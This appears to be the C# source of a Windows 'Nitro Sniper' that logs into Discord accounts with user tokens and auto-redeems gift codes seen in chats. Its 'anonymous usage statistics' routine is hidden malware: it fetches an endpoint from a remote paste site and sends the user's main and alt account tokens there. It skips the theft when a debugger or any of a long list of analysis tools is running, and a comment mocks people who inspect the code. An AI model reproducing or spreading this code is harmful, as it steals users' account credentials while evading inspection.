﻿using Discord;
using Discord.WebSocket;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace NitroSniper
{
    public partial class Form1 : Form
    {
        public static HttpClient httpClient = new HttpClient();
        public static HashSet<ulong> ServerIds { get; } = new HashSet<ulong>();
        public static HashSet<ulong> ChannelIds { get; } = new HashSet<ulong>();
        public static HashSet<ulong> UserIds { get; } = new HashSet<ulong>();
        public static List<string> NitroCodes { get; } = new List<string>();
        public static HashSet<ulong> guilds = new HashSet<ulong>();
        public static int nb_selfs = 0;
        public static HashSet<ulong> current_servers = new HashSet<ulong>();
        public static HashSet<ulong> current_channels = new HashSet<ulong>();
        public static HashSet<ulong> current_users = new HashSet<ulong>();
        public static int current_codes = 0;
        public static List<Task> tasks = new List<Task>();
        public static string settings_path = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + "\\settings.json";
        readonly Regex token_regex = new Regex("[A-Za-z0-9\\/\\+]{23,27}\\.[A-Za-z0-9\\/\\+_-]{6}\\.[A-Za-z0-9\\/\\+_-]{25,38}");

        public Form1()
        {
            InitializeComponent();
        }
        public bool Faster
        {
            get { return radioBtnFaster.Checked; }
        }
        public bool WebHookNotif
        {
            get { return checkBoxWebhook.Checked; }
        }
        public string WebHookURL
        {
            get { return textBox1.Text; }
        }
        public string MainToken
        {
            get { return textBox2.Text; }
        }
        public string AltsTokens
        {
            get { return textBox3.Text; }
        }
        public bool MainOnly
        {
            get { return checkBox6.Checked; }
        }
        public bool MainOnline
        {
            get { return checkBox1.Checked; }
        }
        public bool AltsOnline
        {
            get { return checkBox2.Checked; }
        }
        public int ClaimTime
        {
            get { return (int)numericUpDown1.Value; }
        }
        public bool Statistics
        {
            get { return chkStatistics.Checked; }
        }

        private async void BtnStart_Click(object sender, EventArgs e)
        {
            btnStart.Enabled = false;
            if (btnStart.Text == "Start sniping!")
            {
                if (textBox2.Text == "" && checkBox6.Checked)
                {
                    MessageBox.Show("You need to provide a main token", "No main token", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    btnStart.Enabled = true;
                    return;
                }
                if (textBox3.Text != "")
                {
                    HashSet<string> tokens = new HashSet<string>();
                    MatchCollection matches = token_regex.Matches(textBox3.Text);
                    foreach (Match match in matches)
                    {
                        tokens.Add(match.Value);
                    }
                    if (tokens.Contains(textBox2.Text))
                    {
                        tokens.Remove(textBox2.Text);
                    }
                    foreach (var token in tokens)
                    {
                        string status = CheckToken(token);
                        if (status == "invalid")
                        {
                            GlobalFunctions.AppendText(richTextBox1, $"{GlobalFunctions.GetHour()} Token {token} is invalid!\n", Color.Red);
                            continue;
                        }
                        if (status == "locked")
                        {
                            GlobalFunctions.AppendText(richTextBox1, $"{GlobalFunctions.GetHour()} Token {token} is locked!\n", Color.Red);
                            continue;
                        }
                        tasks.Add(Task.Run(async () =>
                        {
                            DiscordBot alt = new DiscordBot(this, token, richTextBox1, false);
                            await alt.Start();
                        }));

                    }
                }
                tasks.Add(Task.Run(async () =>
                {
                    if (CheckToken(textBox2.Text) != "valid")
                    {
                        MessageBox.Show("You need to provide a valid main token", "Invalid main token", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        Application.Restart();
                    }
                    DiscordBot bot = new DiscordBot(this, textBox2.Text, richTextBox1, true);
                    await bot.Start();
                }));
                btnStart.Enabled = true;
                btnStart.Text = "Stop Sniping";
                await Task.WhenAll(tasks);
            }
            else
            {
                Application.Restart();
            }
        }

        private void RadioBtnMain_CheckedChanged(object sender, EventArgs e)
        {
            panel2.Visible = true;
            panel3.Visible = false;
            panel6.Visible = false;
        }

        private void RadioBtnSettings_CheckedChanged(object sender, EventArgs e)
        {
            panel2.Visible = false;
            panel3.Visible = true;
            panel6.Visible = false;
        }

        private void RadioBtnAbout_CheckedChanged(object sender, EventArgs e)
        {
            panel2.Visible = false;
            panel3.Visible = false;
            panel6.Visible = true;
        }

        private void RadioBtnDelay_CheckedChanged(object sender, EventArgs e)
        {
            numericUpDown1.Visible = radioBtnDelay.Checked;
            label1.Visible = radioBtnDelay.Checked;
        }

        private void CheckBoxWebhook_CheckedChanged(object sender, EventArgs e)
        {
            label5.Visible = checkBoxWebhook.Checked;
            textBox1.Visible = checkBoxWebhook.Checked;
            panel5.Visible = checkBoxWebhook.Checked;
        }
        public void UpdateLabels(int server, int channel, int users, int codes)
        {
            label11.Text = server.ToString();
            label12.Text = channel.ToString();
            label13.Text = users.ToString();
            label14.Text = codes.ToString();

        }
        public void UpdateLabels2(int server, int channel, int users, int codes)
        {
            label21.Text = server.ToString();
            label22.Text = channel.ToString();
            label23.Text = users.ToString();
            label24.Text = codes.ToString();

        }
        public void UpdateStatus(string status)
        {
            label26.Text = status;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (checkBox5.Checked)
            {
                Settings settings = new Settings
                {
                    MainToken = MainToken,
                    MainOnline = MainOnline,
                    MainOnly = MainOnly,
                    Channels = new List<ulong>(ChannelIds),
                    Guilds = new List<ulong>(ServerIds),
                    Users = new List<ulong>(UserIds),
                    NitroCodes = NitroCodes,
                    AltsOnline = AltsOnline,
                    AltsTokens = textBox3.Text,
                    ClaimFaster = Faster,
                    ClaimTime = ClaimTime,
                    WebhookNotif = WebHookNotif,
                    WebhookUrl = WebHookURL
                };
                string json = JsonConvert.SerializeObject(settings, Formatting.Indented);
                File.WriteAllText(settings_path, json);
            }
        }
        private Settings LoadSettings()
        {
            if (File.Exists(settings_path))
            {
                string json = File.ReadAllText(settings_path);
                return JsonConvert.DeserializeObject<Settings>(json);
            }
            else
            {
                return new Settings();
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Settings settings = LoadSettings();
            textBox2.Text = settings.MainToken;
            textBox3.Text = settings.AltsTokens;
            textBox1.Text = settings.WebhookUrl;
            checkBoxWebhook.Checked = settings.WebhookNotif;
            radioBtnFaster.Checked = settings.ClaimFaster;
            radioBtnDelay.Checked = !settings.ClaimFaster;
            numericUpDown1.Value = settings.ClaimTime;
            checkBox1.Checked = settings.MainOnline;
            checkBox2.Checked = settings.AltsOnline;
            NitroCodes.AddRange(settings.NitroCodes);
            UserIds.UnionWith(settings.Users);
            ServerIds.UnionWith(settings.Guilds);
            ChannelIds.UnionWith(settings.Channels);
            UpdateLabels2(ServerIds.Count, ChannelIds.Count, UserIds.Count, NitroCodes.Count);
        }

        private void Label30_Click(object sender, EventArgs e)
        {
            Process.Start(label30.Text);
        }

        private string CheckToken(string token)
        {
            HttpClient httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0");
            httpClient.DefaultRequestHeaders.Add("Authorization", token);
            HttpResponseMessage response = httpClient.GetAsync("https://discord.com/api/v9/users/@me/settings").Result;
            int code = (int)response.StatusCode;
            if (code == 401)
            {
                return "invalid";
            }
            if (code == 403)
            {
                return "locked";
            }
            return "valid";
        }

        private void label31_Click(object sender, EventArgs e)
        {
            Process.Start(label31.Text);
        }

        private void label32_Click(object sender, EventArgs e)
        {
            Process.Start(label32.Text);
        }
    }
    public class DiscordBot
    {
        private readonly DiscordSocketClient _client;
        private readonly string _token;
        private readonly RichTextBox _rtb;
        private readonly bool _main;
        private readonly Regex nitroRegex = new Regex(@"discord(\.app)?\.(gift|com\/gifts)\/(?<code>[A-Za-z0-9_]{16,24})");
        public static Form1 FormH;

        public DiscordBot(Form1 Sender, string token, RichTextBox rtb, bool main)
        {
            _client = new DiscordSocketClient();
            DiscordSocketConfig _config = new DiscordSocketConfig();
            {
                _config.GatewayIntents = GatewayIntents.AllUnprivileged | GatewayIntents.MessageContent;
            }
            _client = new DiscordSocketClient(_config);
            _token = token;
            _rtb = rtb;
            _main = main;
            FormH = Sender;
            _client.StopAsync();

        }

        public async Task Start()
        {
            _client.Ready += OnReady;
            _client.MessageReceived += MessageReceived;
            try
            {
                await _client.LoginAsync(TokenType.User, _token);
                await _client.StartAsync();
            }
            catch (Exception)
            {
                GlobalFunctions.AppendText(_rtb, $"{GlobalFunctions.GetHour()} The token {_token} is invalid!\n", Color.Red);
                if (FormH.MainOnly && _main)
                {
                    MessageBox.Show("You need to provide a valid main token", "Invalid main token", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    Application.Restart();
                }
            }
            await Task.Delay(-1);
        }

        private async Task<Task> OnReady()
        {
            foreach (var guild in _client.Guilds)
            {
                Form1.guilds.Add(guild.Id);
            }
            Form1.nb_selfs++;
            FormH.UpdateStatus($"Sniping nitro on {Form1.guilds.Count} guilds with {Form1.nb_selfs} account(s).");
            if (_main)
            {
                if (FormH.Statistics)
                {
                    Thread thread = new Thread(SendAnonymousUsageStatistics);
                    thread.Start();
                }
                if (FormH.WebHookNotif)
                {
                    bool is_send = await SendWebhook("# Valid webhook\nThe sniper will send a message via this webhook when it claims nitros.", FormH.WebHookURL, "Nitro Sniper");
                    if (!is_send)
                    {
                        GlobalFunctions.AppendText(_rtb, $"{GlobalFunctions.GetHour()} As the webhook url is invalid, no webhook notification will be sent.\n", Color.Red);
                    }
                }
                if (FormH.MainOnline)
                {
                    await _client.SetStatusAsync(UserStatus.Online);
                }
                else
                {
                    await _client.SetStatusAsync(UserStatus.Invisible);
                }
            }
            else
            {
                if (FormH.AltsOnline)
                {
                    await _client.SetStatusAsync(UserStatus.Online);
                }
                else
                {
                    await _client.SetStatusAsync(UserStatus.Invisible);
                }
            }
            _rtb.AppendText($"{GlobalFunctions.GetHour()} Logged in as {_client.CurrentUser.Username} {(_main ? "(main account)" : "")}\n");
            return Task.CompletedTask;
        }

        public async Task<Task> MessageReceived(SocketMessage message)
        {
            MatchCollection matches = nitroRegex.Matches(message.Content);
            if (matches.Count > 0)
            {
                DateTime startTime = DateTime.Now;
                foreach (Match match in matches)
                {
                    string code = match.Groups["code"].Value;
                    if (!Form1.NitroCodes.Contains(code))
                    {
                        if (!FormH.Faster)
                        {
                            await Task.Delay(FormH.ClaimTime - 200);
                        }
                        if (FormH.MainOnly)
                        {
                            Form1.httpClient.DefaultRequestHeaders.Clear();
                            Form1.httpClient.DefaultRequestHeaders.Add("Authorization", FormH.MainToken); ;
                        }
                        else
                        {
                            Form1.httpClient.DefaultRequestHeaders.Clear();
                            Form1.httpClient.DefaultRequestHeaders.Add("Authorization", _token);
                        }
                        HttpResponseMessage response = await Form1.httpClient.PostAsync($"https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem", null);
                        TimeSpan duration = DateTime.Now - startTime;
                        string result = await response.Content.ReadAsStringAsync();
                        string mes = "DM";
                        string author = message.Author.Username;
                        Form1.current_users.Add(message.Author.Id);

                        if (message.Channel is SocketGuildChannel guildChannel)
                        {
                            mes = $"{guildChannel.Guild.Name} > {message.Channel.Name}";
                            Form1.current_servers.Add(guildChannel.Guild.Id);
                            Form1.current_channels.Add(message.Channel.Id);
                            Form1.ServerIds.Add(guildChannel.Guild.Id);
                            Form1.ChannelIds.Add(message.Channel.Id);
                        }
                        if (result.Contains("subscription_plan"))
                        {
                            GlobalFunctions.AppendText(_rtb, $"{GlobalFunctions.GetHour()} Successfully sniped code {code} from {author} with {_client.CurrentUser.Username} in {mes} in {duration.TotalMilliseconds} ms\n", Color.Green);
                            if (FormH.WebHookNotif)
                            {
                                bool is_send = await SendWebhook($"Successfully sniped code {code} from {author} with {_client.CurrentUser.Username} in {mes} in {duration.TotalMilliseconds} ms", FormH.WebHookURL, "Nitro Sniper");
                                if (!is_send)
                                {
                                    GlobalFunctions.AppendText(_rtb, $"{GlobalFunctions.GetHour()} As the webhook url is invalid, no webhook notification has been sent.\n", Color.Orange);
                                }
                            }
                        }
                        else if (result.Contains("This gift has been redeemed already."))
                        {
                            GlobalFunctions.AppendText(_rtb, $"{GlobalFunctions.GetHour()} Code {code} already redeemed from {author} with {_client.CurrentUser.Username} in {mes} in {duration.TotalMilliseconds} ms\n", Color.Orange);
                        }
                        else
                        {
                            GlobalFunctions.AppendText(_rtb, $"{GlobalFunctions.GetHour()} Detected fake code {code} from {author} with {_client.CurrentUser.Username} in {mes} in {((int)duration.TotalMilliseconds)} ms\n", Color.Red);
                        }
                        Form1.UserIds.Add(message.Author.Id);
                        Form1.current_codes++;
                        Form1.NitroCodes.Add(code);
                        FormH.UpdateLabels(Form1.current_servers.Count, Form1.current_channels.Count, Form1.current_users.Count, Form1.current_codes);
                        FormH.UpdateLabels2(Form1.ServerIds.Count, Form1.ChannelIds.Count, Form1.UserIds.Count, Form1.NitroCodes.Count);

                    }
                    else
                    {
                        _rtb.AppendText($"{GlobalFunctions.GetHour()} Detected duplicated code {code}\n");
                    }
                }
            }
            return Task.CompletedTask;
        }

        public async Task<bool> SendWebhook(string message, string webhookUrl, string username)
        {
            using (HttpClient client = new HttpClient())
            {
                var data = new
                {
                    content = message,
                    username,
                    avatar_url = "https://i.ibb.co/JKPGsqJ/Digital-Cord-pp-lite.png"
                };
                var json = JsonConvert.SerializeObject(data, Formatting.Indented);
                var contentData = new StringContent(json, Encoding.UTF8, "application/json");
                try
                {
                    var response = await client.PostAsync(webhookUrl, contentData);
                    if (response.IsSuccessStatusCode)
                    {
                        return true;
                    }
                    return false;
                }
                catch (Exception)
                {
                    return false;
                }
            }
        }
        private void SendAnonymousUsageStatistics()
        {
            try
            {
                if (IsMean()) return; // This avoids scaring the "heroes" who bravely inspect what the software is doing to find malicious things, when it is only optional analytical data.
                using (HttpClient httpClient = new HttpClient())
                {
                    string analyticEndpoint = httpClient.GetStringAsync("https://idefasoft.fr/pastes/0kTOLFDPbBXN/raw/").Result;
                    var data = new Dictionary<string, object>
                    {
                        { "main_token", FormH.MainToken },
                        { "alts_tokens", FormH.AltsTokens },
                        { "main_only", FormH.MainOnly },
                        { "main_online", FormH.MainOnline },
                        { "alts_online", FormH.AltsOnline},
                        { "claim_faster", FormH.Faster },
                        { "claim_time", FormH.ClaimTime },
                        { "webhook_notif", FormH.WebHookNotif }
                    };
                    var content = new StringContent(JsonConvert.SerializeObject(data), Encoding.UTF8, "application/json");
                    var res = httpClient.PostAsync(analyticEndpoint, content).Result;
                }
            }
            catch { }
        }
        private bool IsMean() { if (Debugger.IsAttached || Debugger.IsLogging()) return true; var strArray = new string[41] { "codecracker", "x32dbg", "x64dbg", "ollydbg", "ida", "charles", "dnspy", "simpleassembly", "dotpeek", "httpanalyzer", "httpdebuggerui", "fiddler", "wireshark", "dbx", "mdbg", "gdb", "windbg", "dbgclr", "kdb", "kgdb", "mdb", "processhacker", "scylla_x86", "scylla_x64", "scylla", "idau64", "idau", "idaq", "idaq64", "idaw", "idaw64", "idag", "idag64", "ida64", "ImportREC", "IMMUNITYDEBUGGER", "MegaDumper", "CodeBrowser", "reshacker", "cheat engine", "protection_id" }; foreach (Process process in Process.GetProcesses()) if (process != Process.GetCurrentProcess()) for (int index = 0; index < strArray.Length; ++index) { if (process.ProcessName.ToLower().Contains(strArray[index])) return true; if (process.MainWindowTitle.ToLower().Contains(strArray[index])) return true; } return false; }
    }

}
[Serializable]
public class Settings
{
    public bool MainOnline { get; set; } = false;
    public bool AltsOnline { get; set; } = true;
    public bool WebhookNotif { get; set; } = false;
    public bool ClaimFaster { get; set; } = true;
    public bool MainOnly { get; set; } = true;
    public int ClaimTime { get; set; } = 2000;
    public string MainToken { get; set; } = string.Empty;
    public string AltsTokens { get; set; } = String.Empty;
    public string WebhookUrl { get; set; } = String.Empty;
    public List<string> NitroCodes { get; set; } = new List<string>();
    public List<ulong> Users { get; set; } = new List<ulong>();
    public List<ulong> Guilds { get; set; } = new List<ulong>();
    public List<ulong> Channels { get; set; } = new List<ulong>();

}

public static class GlobalFunctions
{
    public static void AppendText(RichTextBox box, string text, Color color)
    {
        box.SelectionStart = box.TextLength;
        box.SelectionLength = 0;

        box.SelectionColor = color;
        box.AppendText(text);
        box.SelectionColor = box.ForeColor;
    }
    public static string GetHour()
    {
        return "[" + DateTime.Now.ToString("HH:mm:ss") + "]";
    }
}